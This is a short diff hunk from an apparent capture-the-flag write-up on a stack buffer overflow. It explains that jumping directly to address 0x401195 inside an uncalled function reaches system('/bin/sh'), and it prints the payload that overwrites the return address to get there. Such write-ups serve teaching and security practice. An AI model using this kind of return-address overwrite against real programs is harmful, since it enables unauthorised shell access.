@@ -81,5 +81,5 @@
    4011c5:	c3                   	ret 
    ```
    Find a function, `fun1`, that never been called but call `system("/bin/sh")`. However, if call `func1`, it needs to fulfill certain requirement to jump to where it call `system("/bin/sh")`. Therefore, let it jump to `0x401195` directly.
-3. Combine step 1 and 2.
+3. Combine step 1 and 2.  
    `payload = 'a' * (0x10 + 8) + p64(0x401195)`
